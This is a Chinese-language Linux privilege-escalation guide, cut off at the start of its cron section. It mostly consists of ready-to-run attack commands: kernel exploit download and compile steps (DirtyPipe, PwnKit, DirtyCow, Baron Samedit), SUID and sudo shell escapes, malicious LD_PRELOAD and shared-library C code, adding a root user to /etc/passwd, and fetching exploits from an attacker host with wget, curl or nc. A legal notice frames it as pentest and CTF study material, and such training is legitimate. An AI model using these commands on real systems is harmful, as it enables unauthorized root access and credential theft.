# Linux 权限提升完全指南

> 从普通用户到 root - 基于 2024/2025 最新技术

---

## 目录

1. [Linux 提权概述](#1-linux-提权概述)
2. [信息收集](#2-信息收集)
3. [内核漏洞提权](#3-内核漏洞提权)
4. [SUID/SGID 提权](#4-suidsgid-提权)
5. [Sudo 提权](#5-sudo-提权)
6. [Capabilities 提权](#6-capabilities-提权)
7. [计划任务提权](#7-计划任务提权)
8. [PATH 环境变量劫持](#8-path-环境变量劫持)
9. [NFS 提权](#9-nfs-提权)
10. [Docker 逃逸](#10-docker-逃逸)
11. [密码与凭证](#11-密码与凭证)
12. [自动化工具](#12-自动化工具)
13. [实战案例](#13-实战案例)
14. [常见错误与解决](#14-常见错误与解决)

---

## 1. Linux 提权概述

### 1.1 什么是权限提升？

权限提升（Privilege Escalation）是指从低权限用户获取更高权限的过程。在 Linux 系统中，通常是从普通用户提升到 root 用户权限。

**通俗理解**：就像在公司里，你是普通员工，但通过某些方法获得了 CEO 的权限，可以访问所有机密文件和控制整个公司。在 Linux 中，root 就是那个"CEO"。

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Linux 权限层级                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    root (UID 0) - 最高权限                   │   │
│  │  • 可以访问系统所有资源                                       │   │
│  │  • 可以修改任何文件                                          │   │
│  │  • 可以执行任何命令                                          │   │
│  │  • 可以管理所有用户和进程                                     │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 提权目标                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    sudo 用户                                 │   │
│  │  • 可以通过 sudo 执行特定或所有 root 命令                     │   │
│  │  • 权限由 /etc/sudoers 配置                                  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 提权目标                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    普通用户                                  │   │
│  │  • 只能访问自己的文件                                        │   │
│  │  • 受限的系统访问                                            │   │
│  │  • 不能修改系统配置                                          │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 初始访问                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    服务账户 / www-data                       │   │
│  │  • 最低权限                                                  │   │
│  │  • 通常是 Web Shell 获得的初始权限                           │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 提权方法分类

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Linux 提权方法分类                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  【内核漏洞】                                                        │
│  • 利用 Linux 内核的漏洞直接获取 root                               │
│  • 如: DirtyPipe, DirtyCow, PwnKit                                  │
│  • 成功率高，但依赖特定内核版本                                     │
│                                                                      │
│  【SUID/SGID】                                                       │
│  • 利用设置了 SUID 位的程序                                         │
│  • 程序以文件所有者权限运行                                         │
│  • GTFOBins 是重要参考资源                                          │
│                                                                      │
│  【Sudo 配置错误】                                                   │
│  • 利用 sudoers 配置不当                                            │
│  • sudo 版本漏洞                                                    │
│  • 允许执行的命令可被滥用                                           │
│                                                                      │
│  【Capabilities】                                                    │
│  • Linux 细粒度权限控制                                             │
│  • 某些 capability 可被利用提权                                     │
│                                                                      │
│  【计划任务】                                                        │
│  • Cron 任务配置不当                                                │
│  • 可写的脚本或通配符注入                                           │
│                                                                      │
│  【环境变量】                                                        │
│  • PATH 劫持                                                        │
│  • LD_PRELOAD 注入                                                  │
│                                                                      │
│  【容器逃逸】                                                        │
│  • Docker 特权容器                                                  │
│  • 挂载宿主机文件系统                                               │
│                                                                      │
│  【凭证相关】                                                        │
│  • 明文密码                                                         │
│  • SSH 密钥                                                         │
│  • 密码重用                                                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.3 Linux 安全机制

```
┌─────────────────────────────────────────────────────────────────────┐
│ Linux 安全机制                                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 1. 用户和组权限                                                      │
│    • 每个文件有 owner、group、others 三类权限                        │
│    • 读(r)、写(w)、执行(x) 三种权限                                  │
│                                                                      │
│ 2. SUID/SGID/Sticky Bit                                             │
│    • SUID: 以文件所有者权限执行                                      │
│    • SGID: 以文件所属组权限执行                                      │
│    • Sticky: 只有所有者能删除文件                                    │
│                                                                      │
│ 3. Capabilities                                                      │
│    • 细粒度的权限控制                                                │
│    • 替代传统的 SUID root                                            │
│    • 如: CAP_NET_BIND_SERVICE, CAP_SETUID                           │
│                                                                      │
│ 4. SELinux / AppArmor                                               │
│    • 强制访问控制 (MAC)                                              │
│    • 限制进程可以访问的资源                                          │
│                                                                      │
│ 5. Seccomp                                                          │
│    • 限制进程可以使用的系统调用                                      │
│                                                                      │
│ 6. Namespaces & Cgroups                                             │
│    • 容器隔离的基础                                                  │
│    • 资源限制和隔离                                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.4 法律声明

```
⚠️ 重要提醒 ⚠️

本笔记仅供合法的安全测试和学习使用：

✓ 合法场景：
  • 授权的渗透测试
  • 自己的测试环境
  • CTF 比赛
  • 安全研究

✗ 非法行为：
  • 未授权访问他人系统
  • 恶意提权和破坏
  • 任何违法活动

违法使用将承担法律责任！
```

---

## 2. 信息收集

信息收集是提权的第一步，也是最重要的一步。只有充分了解目标系统，才能找到合适的提权方法。

### 2.1 系统基本信息

```bash
# 系统版本信息 - 这是最重要的，决定了可用的内核漏洞
uname -a                    # 内核版本
cat /etc/os-release         # 发行版信息
cat /etc/issue              # 发行版信息
cat /proc/version           # 内核版本详情
hostnamectl                 # 系统信息汇总

# 主机名
hostname

# 系统架构
uname -m
arch

# 内核版本（重要！用于查找内核漏洞）
uname -r
```

### 2.2 用户信息

```bash
# 当前用户
whoami
id                          # 详细信息，包括 UID、GID、所属组

# 所有用户
cat /etc/passwd
# 格式: 用户名:密码占位:UID:GID:描述:家目录:Shell
# 重点关注: UID 0 的用户（root）、有 shell 的用户

# 可登录的用户（有真实 shell）
cat /etc/passwd | grep -v "nologin\|false"

# 查看 shadow 文件（通常需要 root 权限）
cat /etc/shadow

# 所有组
cat /etc/group

# 当前登录用户
w
who
users
last                        # 登录历史

# 用户家目录
ls -la /home/
ls -la /root/               # 通常无权限

# 检查其他用户的文件
find /home -type f -name ".*" 2>/dev/null
```

### 2.3 网络信息

```bash
# 网络接口
ifconfig
ip addr
ip a

# 路由表
route -n
ip route

# 网络连接
netstat -antup              # 所有连接
netstat -tlnp               # 监听的端口
ss -tlnp                    # 更现代的命令

# 防火墙规则
iptables -L -n
iptables -L -n -v

# ARP 表
arp -a
ip neigh

# DNS 配置
cat /etc/resolv.conf

# hosts 文件
cat /etc/hosts

# 网络服务
cat /etc/services
```

### 2.4 进程和服务

```bash
# 运行的进程
ps aux
ps -ef
ps auxwww                   # 完整命令行

# 以 root 运行的进程（重点关注）
ps aux | grep root

# 查找特定进程
ps aux | grep -i "mysql\|apache\|nginx"

# 进程树
pstree

# 服务状态
systemctl list-units --type=service
systemctl list-units --type=service --state=running
service --status-all

# 开机启动的服务
systemctl list-unit-files --type=service | grep enabled
```

### 2.5 软件和应用

```bash
# 已安装的软件
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed

# 查找特定软件版本
dpkg -l | grep -i "mysql\|apache\|nginx\|php"

# 软件版本（用于查找已知漏洞）
mysql --version
apache2 -v
nginx -v
php -v
python --version
perl -v
```

### 2.6 敏感文件搜索

```bash
# 搜索包含密码的文件
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
grep -ri "password" /home/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# 常见配置文件
cat /etc/passwd
cat /etc/shadow              # 通常需要 root
cat /etc/sudoers             # sudo 配置
cat /etc/sudoers.d/*

# Web 配置文件（可能包含数据库密码）
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /var/www/html/.env
find /var/www -name "*.php" -exec grep -l "password" {} \; 2>/dev/null

# 数据库配置
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf    # Debian MySQL 默认凭证

# SSH 相关
ls -la ~/.ssh/
cat ~/.ssh/id_rsa            # 私钥
cat ~/.ssh/authorized_keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 历史文件（可能包含密码）
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.vim_history
cat ~/.python_history

# 查找所有历史文件
find / -name "*_history" -o -name ".*_history" 2>/dev/null

# 备份文件
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

### 2.7 文件权限检查

```bash
# 查找 SUID 文件（非常重要！）
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查找 SGID 文件
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# 查找 SUID 和 SGID 文件
find / -perm -6000 -type f 2>/dev/null

# 查找可写文件
find / -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# 查找可写目录
find / -writable -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# 查找无主文件
find / -nouser -type f 2>/dev/null
find / -nogroup -type f 2>/dev/null

# 查找 world-writable 文件
find / -perm -0002 -type f 2>/dev/null

# 检查 /etc/passwd 是否可写（罕见但致命）
ls -la /etc/passwd

# 检查 /etc/shadow 是否可读
ls -la /etc/shadow
```

### 2.8 计划任务

```bash
# 系统 cron
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*

# 用户 cron
crontab -l
cat /var/spool/cron/crontabs/*

# systemd timers
systemctl list-timers --all

# 查找 cron 相关文件
find /etc -name "*cron*" 2>/dev/null

# 检查 cron 日志
cat /var/log/cron.log
grep CRON /var/log/syslog
```

### 2.9 Capabilities

```bash
# 查找有 capabilities 的文件
getcap -r / 2>/dev/null

# 常见危险的 capabilities:
# cap_setuid - 可以设置 UID
# cap_setgid - 可以设置 GID
# cap_dac_override - 绕过文件权限检查
# cap_dac_read_search - 绕过读取权限检查
# cap_net_raw - 原始套接字
# cap_sys_admin - 系统管理（非常危险）
# cap_sys_ptrace - 进程跟踪
```

---

## 3. 内核漏洞提权

内核漏洞是最直接的提权方式，成功率高，但需要匹配特定的内核版本。

### 3.1 漏洞检测

```bash
# 查看内核版本
uname -r
uname -a
cat /proc/version

# 使用 Linux Exploit Suggester
# 下载: https://github.com/The-Z-Labs/linux-exploit-suggester
./linux-exploit-suggester.sh

# 或使用 Python 版本
# https://github.com/mzet-/linux-exploit-suggester
python linux-exploit-suggester-2.py

# 使用 searchsploit 搜索
searchsploit linux kernel 5.4 privilege escalation
searchsploit linux kernel ubuntu
```

### 3.2 常见内核漏洞

```
┌─────────────────────────────────────────────────────────────────────┐
│ 常见 Linux 内核漏洞 (2020-2025)                                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ CVE-2024-1086 - nf_tables (netfilter)                               │
│ 影响: Linux Kernel 5.14 - 6.6                                       │
│ 类型: Use-After-Free                                                │
│                                                                      │
│ CVE-2023-32233 - nf_tables (netfilter)                              │
│ 影响: Linux Kernel < 6.3.1                                          │
│ 类型: Use-After-Free                                                │
│                                                                      │
│ CVE-2023-0386 - OverlayFS                                           │
│ 影响: Linux Kernel < 6.2                                            │
│ 类型: 权限提升                                                      │
│                                                                      │
│ CVE-2022-0847 - DirtyPipe ⭐                                        │
│ 影响: Linux Kernel 5.8 - 5.16.11, 5.15.25, 5.10.102                │
│ 类型: 任意文件覆写                                                  │
│                                                                      │
│ CVE-2022-2588 - route4 filter                                       │
│ 影响: Linux Kernel < 5.19                                           │
│ 类型: Use-After-Free                                                │
│                                                                      │
│ CVE-2022-34918 - nf_tables                                          │
│ 影响: Linux Kernel 5.8 - 5.18.9                                     │
│ 类型: 堆溢出                                                        │
│                                                                      │
│ CVE-2021-4034 - PwnKit (Polkit) ⭐                                  │
│ 影响: 几乎所有 Linux 发行版 (2009-2022)                             │
│ 类型: 内存损坏                                                      │
│                                                                      │
│ CVE-2021-3156 - Baron Samedit (sudo)                                │
│ 影响: sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1                       │
│ 类型: 堆溢出                                                        │
│                                                                      │
│ CVE-2021-22555 - Netfilter                                          │
│ 影响: Linux Kernel 2.6.19 - 5.12                                    │
│ 类型: 堆溢出                                                        │
│                                                                      │
│ CVE-2016-5195 - DirtyCow (经典)                                     │
│ 影响: Linux Kernel 2.6.22 - 4.8.3                                   │
│ 类型: 竞态条件                                                      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 DirtyPipe (CVE-2022-0847)

DirtyPipe 是 2022 年发现的严重漏洞，允许覆写任意只读文件，非常容易利用。

```bash
# 检查内核版本是否受影响
uname -r
# 受影响版本: 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102

# 方法 1: 覆写 /etc/passwd
# 下载 exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

# 编译
gcc exploit.c -o exploit

# 执行（会在 /etc/passwd 中添加 root 用户）
./exploit

# 方法 2: 覆写 SUID 程序
# 下载: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# 编译
gcc exploit-2.c -o exploit-2

# 执行（会修改 /usr/bin/su 获取 root shell）
./exploit-2 /usr/bin/su

# 执行后直接获得 root shell
```

**原理解释**：
DirtyPipe 利用了 Linux 管道（pipe）的一个漏洞。正常情况下，管道缓冲区有一个标志位表示是否可以合并数据。攻击者可以通过特殊操作设置这个标志，然后利用 splice() 系统调用将恶意数据"合并"到只读文件的页缓存中，从而实现任意文件覆写。

### 3.4 PwnKit (CVE-2021-4034)

PwnKit 是 Polkit 的 pkexec 组件中的漏洞，影响范围极广，几乎所有 Linux 发行版都受影响。

```bash
# 检查 pkexec 是否存在
which pkexec
ls -la /usr/bin/pkexec

# 检查 Polkit 版本
pkexec --version

# 方法 1: 使用 C 语言 exploit
# 下载: https://github.com/berdav/CVE-2021-4034

# 编译
make

# 执行
./cve-2021-4034

# 方法 2: 使用 Python exploit（无需编译）
# 下载: https://github.com/joeammond/CVE-2021-4034

python3 CVE-2021-4034.py

# 方法 3: 使用 Shell 脚本
# 下载: https://github.com/ly4k/PwnKit

curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit
```

**原理解释**：
pkexec 是一个 SUID root 程序，用于以其他用户身份执行命令。漏洞在于 pkexec 处理命令行参数时存在越界读写。当 argc 为 0 时（正常情况下不可能），pkexec 会读取 argv[1]，实际上读取的是环境变量。攻击者可以通过精心构造的环境变量注入恶意共享库，获得 root 权限。

### 3.5 DirtyCow (CVE-2016-5195)

虽然是老漏洞，但仍有很多未打补丁的系统。

```bash
# 检查内核版本
uname -r
# 受影响版本: 2.6.22 <= kernel <= 4.8.3

# 方法 1: 修改 /etc/passwd
# 下载: https://github.com/firefart/dirtycow

gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password
# 会创建一个名为 firefart 的 root 用户

# 方法 2: 修改 SUID 程序
# 下载: https://github.com/dirtycow/dirtycow.github.io

gcc -pthread dcow.c -o dcow
./dcow

# 方法 3: 使用 cowroot
gcc cowroot.c -o cowroot -pthread
./cowroot
```

**原理解释**：
DirtyCow 利用了 Linux 内核内存子系统处理写时复制（Copy-on-Write）时的竞态条件。通过快速交替执行 madvise() 和写操作，可以在内核完成权限检查后、实际写入前，将目标页面替换为只读文件的映射，从而实现对只读文件的写入。

### 3.6 Baron Samedit (CVE-2021-3156)

sudo 的堆溢出漏洞，影响广泛。

```bash
# 检查 sudo 版本
sudo --version
# 受影响版本: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1

# 检测是否存在漏洞
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# 如果崩溃或报错 "sudoedit: \" 则可能存在漏洞

# 使用 exploit
# 下载: https://github.com/blasty/CVE-2021-3156

make
./sudo-hax-me-a-sandwich

# 或使用 Python 版本
# https://github.com/worawit/CVE-2021-3156
python3 exploit_nss.py
```

### 3.7 编译和传输 Exploit

```bash
# 在攻击机上编译（推荐静态编译）
gcc -static exploit.c -o exploit

# 如果目标机有编译器
gcc exploit.c -o exploit

# 传输方法

# 方法 1: HTTP 服务器
# 攻击机
python3 -m http.server 8080
# 目标机
wget http://attacker_ip:8080/exploit
curl http://attacker_ip:8080/exploit -o exploit

# 方法 2: Netcat
# 攻击机
nc -lvp 4444 < exploit
# 目标机
nc attacker_ip 4444 > exploit

# 方法 3: Base64 编码
# 攻击机
base64 exploit > exploit.b64
# 复制内容到目标机
base64 -d exploit.b64 > exploit

# 方法 4: SCP（如果有 SSH 访问）
scp exploit user@target:/tmp/

# 赋予执行权限
chmod +x exploit

# 执行
./exploit
```

---

## 4. SUID/SGID 提权

SUID（Set User ID）是 Linux 中一个重要的权限机制。当一个程序设置了 SUID 位，它会以文件所有者的权限运行，而不是执行者的权限。如果一个 SUID 程序的所有者是 root，那么任何用户执行它时都会获得 root 权限。

### 4.1 SUID 基础

```bash
# SUID 权限说明
# -rwsr-xr-x  <- 注意 's' 表示 SUID
# 当普通用户执行这个程序时，程序以 root 权限运行

# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 查找 root 所有的 SUID 文件
find / -user root -perm -4000 -type f 2>/dev/null

# 查找 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 常见的合法 SUID 程序
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/bin/su
# /usr/bin/ping
# /usr/bin/mount
```

### 4.2 GTFOBins

GTFOBins (https://gtfobins.github.io/) 是一个收集了可被滥用的 Unix 二进制文件的网站。当你发现一个 SUID 程序时，首先应该在 GTFOBins 上查找。

```
┌─────────────────────────────────────────────────────────────────────┐
│ 常见可利用的 SUID 程序                                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 文件操作类:                                                          │
│ • cp, mv - 复制/移动文件                                            │
│ • cat, less, more, head, tail - 读取文件                            │
│ • nano, vim, vi - 编辑文件                                          │
│ • dd - 数据复制                                                     │
│                                                                      │
│ 命令执行类:                                                          │
│ • bash, sh, zsh, csh - Shell                                        │
│ • env - 环境变量                                                    │
│ • find - 文件查找                                                   │
│ • awk, sed - 文本处理                                               │
│ • python, perl, ruby, php - 脚本语言                                │
│ • nmap (旧版本)                                                     │
│                                                                      │
│ 网络类:                                                              │
│ • wget, curl - 下载文件                                             │
│ • nc, netcat - 网络工具                                             │
│                                                                      │
│ 其他:                                                                │
│ • docker - 容器                                                     │
│ • systemctl - 服务管理                                              │
│ • journalctl - 日志查看                                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.3 常见 SUID 提权方法

#### bash/sh

```bash
# 如果 bash 有 SUID 位
/bin/bash -p
# -p 参数保持权限，不会降权

# 或者
/bin/sh -p
```

#### find

```bash
# find 可以执行命令
find . -exec /bin/sh -p \; -quit

# 或者
find . -exec /bin/bash -p \; -quit

# 使用 -exec 执行任意命令
find . -exec whoami \;
```

#### vim/vi

```bash
# 方法 1: 在 vim 中执行 shell
vim -c ':!/bin/sh'

# 方法 2: 在 vim 中
:set shell=/bin/sh
:shell

# 方法 3: 使用 Python
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# 方法 4: 读取敏感文件
vim /etc/shadow
```

#### nano

```bash
# 在 nano 中
# Ctrl+R 读取文件
# Ctrl+X 执行命令

# 或者直接读取敏感文件
nano /etc/shadow

# 修改 /etc/passwd 添加 root 用户
nano /etc/passwd
# 添加: hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash
```

#### less/more

```bash
# less 可以执行命令
less /etc/passwd
# 然后输入
!/bin/sh

# more 同样
more /etc/passwd
!/bin/sh
```

#### awk

```bash
# awk 可以执行系统命令
awk 'BEGIN {system("/bin/sh")}'

# 或者
awk 'BEGIN {system("/bin/bash -p")}'
```

#### python

```bash
# Python 可以执行 shell
python -c 'import os; os.system("/bin/sh")'

# 或者
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Python3
python3 -c 'import os; os.system("/bin/sh")'

# 使用 pty
python -c 'import pty; pty.spawn("/bin/sh")'
```

#### perl

```bash
# Perl 执行 shell
perl -e 'exec "/bin/sh";'

# 或者
perl -e 'system("/bin/sh");'
```

#### ruby

```bash
# Ruby 执行 shell
ruby -e 'exec "/bin/sh"'
```

#### php

```bash
# PHP 执行 shell
php -r 'system("/bin/sh");'

# 或者
php -r 'exec("/bin/sh");'
```

#### nmap (旧版本 < 5.21)

```bash
# 旧版本 nmap 有交互模式
nmap --interactive
!sh

# 或者使用脚本
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
nmap --script=/tmp/shell.nse
```

#### env

```bash
# env 可以执行命令
env /bin/sh -p
```

#### cp

```bash
# 复制 /etc/passwd 并修改
cp /etc/passwd /tmp/passwd.bak
# 生成密码哈希
openssl passwd -1 -salt hacker password123
# 输出类似: $1$hacker$xxxxx

# 创建新的 passwd 文件
echo 'hacker:$1$hacker$xxxxx:0:0::/root:/bin/bash' >> /tmp/passwd.bak
# 复制回去
cp /tmp/passwd.bak /etc/passwd

# 然后登录
su hacker
# 密码: password123
```

### 4.4 自定义 SUID 程序

有时候管理员会创建自定义的 SUID 程序，这些程序可能存在漏洞。

```bash
# 检查程序调用了什么
strings /path/to/suid_program
ltrace /path/to/suid_program
strace /path/to/suid_program

# 如果程序调用了其他命令但没有使用绝对路径
# 例如程序中有: system("cat /etc/shadow")
# 可以通过 PATH 劫持（见第8节）

# 如果程序读取用户输入
# 可能存在缓冲区溢出或命令注入
```

### 4.5 共享库劫持

如果 SUID 程序加载了可写目录中的共享库，可以进行劫持。

```bash
# 查看程序加载的共享库
ldd /path/to/suid_program

# 检查 LD_LIBRARY_PATH
echo $LD_LIBRARY_PATH

# 如果有可写的库路径，创建恶意库
# malicious.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}

# 编译
gcc -shared -fPIC -o /path/to/writable/libname.so malicious.c

# 执行 SUID 程序
/path/to/suid_program
```

---

## 5. Sudo 提权

sudo 允许普通用户以其他用户（通常是 root）的身份执行命令。sudo 的配置在 /etc/sudoers 文件中。

### 5.1 Sudo 基础检查

```bash
# 检查当前用户的 sudo 权限
sudo -l

# 输出示例:
# User user may run the following commands on host:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (root) /usr/bin/less

# 检查 sudo 版本（用于查找漏洞）
sudo --version

# 检查 sudoers 文件（通常需要 root）
cat /etc/sudoers
cat /etc/sudoers.d/*
```

### 5.2 常见 Sudo 提权

#### sudo ALL

```bash
# 如果有 (ALL) ALL 或 (ALL:ALL) ALL
sudo su
sudo bash
sudo /bin/sh
```

#### sudo vim

```bash
# 方法 1
sudo vim -c ':!/bin/sh'

# 方法 2: 在 vim 中
:set shell=/bin/sh
:shell

# 方法 3
sudo vim
:!bash
```

#### sudo less/more

```bash
sudo less /etc/passwd
!/bin/sh

sudo more /etc/passwd
!/bin/sh
```

#### sudo find

```bash
sudo find . -exec /bin/sh \; -quit
sudo find /etc/passwd -exec /bin/sh \;
```

#### sudo awk

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### sudo nmap

```bash
# 旧版本
sudo nmap --interactive
!sh

# 新版本
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

#### sudo python/perl/ruby

```bash
sudo python -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo ruby -e 'exec "/bin/sh"'
```

#### sudo env

```bash
sudo env /bin/sh
```

#### sudo man

```bash
sudo man man
!/bin/sh
```

#### sudo ftp

```bash
sudo ftp
!/bin/sh
```

#### sudo git

```bash
sudo git -p help config
!/bin/sh

# 或者
sudo git branch --help
!/bin/sh
```

#### sudo zip

```bash
# 创建临时文件
touch /tmp/test
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### sudo tar

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# 或者
sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
```

#### sudo wget

```bash
# 覆写 /etc/passwd
# 在攻击机上准备恶意 passwd 文件
# 添加: hacker:$1$hacker$xxxxx:0:0::/root:/bin/bash

# 启动 HTTP 服务器
python3 -m http.server 8080

# 在目标机上
sudo wget http://attacker_ip:8080/passwd -O /etc/passwd

# 然后登录
su hacker
```

#### sudo apache2

```bash
sudo apache2 -f /etc/shadow
# 会显示 shadow 文件内容（作为错误信息）
```

#### sudo mysql

```bash
sudo mysql -e '\! /bin/sh'
```

#### sudo systemctl

```bash
# 方法 1: 创建恶意服务
# 创建服务文件
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > /tmp/evil.service

sudo systemctl link /tmp/evil.service
sudo systemctl enable --now /tmp/evil.service

# 方法 2: 使用 less
sudo systemctl status
!/bin/sh
```

#### sudo journalctl

```bash
sudo journalctl
!/bin/sh
```

### 5.3 Sudo 版本漏洞

```bash
# CVE-2021-3156 (Baron Samedit)
# 影响 sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudo --version

# 检测
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2019-14287
# 影响 sudo < 1.8.28
# 当 sudoers 配置为 (ALL, !root) 时可绕过
sudo -u#-1 /bin/bash
# -1 会被解释为 4294967295，然后转换为 0 (root)

# CVE-2019-18634
# 影响 sudo < 1.8.26 (启用 pwfeedback)
# 缓冲区溢出
```

### 5.4 Sudo 环境变量

```bash
# 检查 sudo 是否保留环境变量
sudo -l
# 查看 env_keep 或 env_reset

# LD_PRELOAD 提权
# 如果 sudoers 中有 env_keep+=LD_PRELOAD

# 创建恶意共享库
# preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}

# 编译
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

# 执行
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/allowed_command

# LD_LIBRARY_PATH 提权
# 如果 sudoers 中有 env_keep+=LD_LIBRARY_PATH
# 类似方法，创建恶意库替换程序依赖的库
```

---

## 6. Capabilities 提权

Linux Capabilities 是一种细粒度的权限控制机制，将 root 的权限分解为多个独立的能力。某些 capability 可以被利用来提权。

### 6.1 Capabilities 基础

```bash
# 查找有 capabilities 的文件
getcap -r / 2>/dev/null

# 常见输出示例:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep

# 查看特定文件的 capabilities
getcap /usr/bin/python3

# 设置 capabilities（需要 root）
setcap cap_setuid+ep /usr/bin/python3
```

```
┌─────────────────────────────────────────────────────────────────────┐
│ 危险的 Capabilities                                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ cap_setuid                                                          │
│ • 允许设置进程的 UID                                                │
│ • 可以直接提权到 root                                               │
│                                                                      │
│ cap_setgid                                                          │
│ • 允许设置进程的 GID                                                │
│ • 可以加入任意组                                                    │
│                                                                      │
│ cap_dac_override                                                    │
│ • 绕过文件读写执行权限检查                                          │
│ • 可以读写任意文件                                                  │
│                                                                      │
│ cap_dac_read_search                                                 │
│ • 绕过文件读取权限检查                                              │
│ • 可以读取任意文件                                                  │
│                                                                      │
│ cap_sys_admin                                                       │
│ • 系统管理能力                                                      │
│ • 非常危险，几乎等同于 root                                         │
│                                                                      │
│ cap_sys_ptrace                                                      │
│ • 允许跟踪任意进程                                                  │
│ • 可以注入代码到其他进程                                            │
│                                                                      │
│ cap_chown                                                           │
│ • 允许更改文件所有者                                                │
│ • 可以获取任意文件的所有权                                          │
│                                                                      │
│ cap_fowner                                                          │
│ • 绕过文件所有者检查                                                │
│ • 可以修改任意文件的权限                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.2 cap_setuid 提权

```bash
# 如果 python 有 cap_setuid
# /usr/bin/python3 = cap_setuid+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 如果 perl 有 cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# 如果 ruby 有 cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# 如果 php 有 cap_setuid
php -r "posix_setuid(0); system('/bin/bash');"
```

### 6.3 cap_dac_read_search 提权

```bash
# 可以读取任意文件
# 如果 tar 有 cap_dac_read_search

# 读取 /etc/shadow
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow

# 读取 SSH 私钥
tar -cvf keys.tar /root/.ssh/
tar -xvf keys.tar
cat root/.ssh/id_rsa
```

### 6.4 cap_sys_admin 提权

```bash
# cap_sys_admin 非常危险
# 可以挂载文件系统

# 如果有 cap_sys_admin 的程序
# 可以挂载宿主机文件系统（在容器中）

mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### 6.5 cap_sys_ptrace 提权

```bash
# 可以注入代码到其他进程
# 找到以 root 运行的进程

ps aux | grep root

# 使用 gdb 或自定义工具注入 shellcode
# 这需要更高级的技术
```

---

## 7. 计划任务提权

